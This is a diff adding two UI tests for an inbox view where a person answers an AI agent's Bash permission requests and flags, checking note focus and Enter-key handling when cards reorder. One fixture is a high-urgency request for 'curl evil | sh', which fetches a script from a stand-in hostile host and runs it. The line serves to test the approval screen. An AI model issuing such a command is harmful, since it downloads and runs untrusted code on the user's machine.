@@ -293,6 +293,83 @@ describe('InboxView', () => {
       });
     });
 
+    it('keeps a half-written note, and the keys typed into it, on its card when another sorts first', async () => {
+      const a = permission('npm test', 'normal');
+      const b = permission('curl evil | sh', 'high');
+      const { answers, replace } = liveInbox([a]);
+      const { queryClient } = renderApp('/inbox');
+      await screen.findByText('Allow Bash? npm test');
+
+      key('n');
+      const note = screen.getByLabelText('Note for the agent (optional)');
+      await waitFor(() => {
+        expect(document.activeElement).toBe(note);
+      });
+      fireEvent.change(note, { target: { value: 'ok' } });
+      replace([b, a]);
+      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
+      await screen.findByText('Allow Bash? curl evil | sh');
+
+      // The builder types on: the rest of the note goes wherever focus is now.
+      const typingInto = document.activeElement ?? document.body;
+      fireEvent.keyDown(typingInto, { key: '3' });
+      fireEvent.keyDown(typingInto, { key: 'Enter' });
+      expect(screen.getByLabelText('Note for the agent (optional)')).toBe(note);
+      expect(document.activeElement).toBe(note);
+      if (!(note instanceof HTMLTextAreaElement)) throw new Error('the note is not a textarea');
+      expect(note.value).toBe('ok');
+
+      fireEvent.click(screen.getByRole('radio', { name: /Allow once/ }));
+      fireEvent.keyDown(note, { key: 'Enter', metaKey: true });
+      await waitFor(() => {
+        expect(answers).toEqual([{ id: a.id, body: { choice: 'allow_once', note: 'ok' } }]);
+      });
+    });
+
+    it('gives Enter to the card shown after an answer, not to one that arrives later', async () => {
+      const a = permission('npm test', 'normal');
+      const shown = inboxItemDto({
+        kind: 'flag',
+        title: 'Write outside every claim',
+        body: 'docs/shown.md',
+        options: [],
+      });
+      const late = inboxItemDto({
+        kind: 'flag',
+        title: 'Write inside another workstream claim',
+        body: 'src/ui/late.tsx',
+        urgency: 'high',
+        options: [],
+      });
+      let current = [a, shown];
+      const answers: { id: string; body: unknown }[] = [];
+      serve(
+        http.get(daemonUrl('/inbox'), () =>
+          HttpResponse.json(current.filter((i) => !answers.some((x) => x.id === i.id))),
+        ),
+        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
+          const id = String(params['id']);
+          answers.push({ id, body: await request.json() });
+          return HttpResponse.json({ ...current.find((i) => i.id === id), state: 'ANSWERED' });
+        }),
+      );
+      const { queryClient } = renderApp('/inbox');
+      await screen.findByText('Allow Bash? npm test');
+
+      key('1');
+      key('Enter');
+      expect(await screen.findByText('docs/shown.md')).toBeTruthy();
+      current = [late, shown];
+      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
+      await screen.findByText('Write inside another workstream claim');
+      expect(screen.queryByText('src/ui/late.tsx')).toBeNull();
+
+      key('Enter');
+      await waitFor(() => {
+        expect(answers.map((x) => x.id)).toEqual([a.id, shown.id]);
+      });
+    });
+
     it('keeps a card error off the next card', async () => {
       const a = permission('npm test', 'normal');
       const b = permission('ls', 'normal');
